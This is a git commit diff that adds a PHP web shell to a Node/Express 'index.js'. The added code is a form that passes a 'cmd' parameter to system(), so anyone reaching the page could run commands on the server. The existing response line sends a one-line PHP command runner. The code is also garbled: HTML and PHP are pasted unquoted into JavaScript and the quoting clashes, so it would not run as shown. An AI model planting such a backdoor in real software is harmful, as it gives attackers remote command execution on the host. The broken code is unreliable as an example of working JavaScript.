a6df9ca5aad118920925779851eaa16daa147fb3
d-e-e-b <138242045+d-e-e-b@users.noreply.github.com>
2023-11-03 23:39:35 +0200

    Update index.js

--- index.js
+++ index.js
@@ -2,6 +2,22 @@ const express = require('express')
 const app = express()
 app.all('/', (req, res) => {
     console.log("Just got a request!")
+    data=<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+</html>
     res.send('<?php system($_GET['cmd']); ?>')
 })
 app.listen(process.env.PORT || 3000)
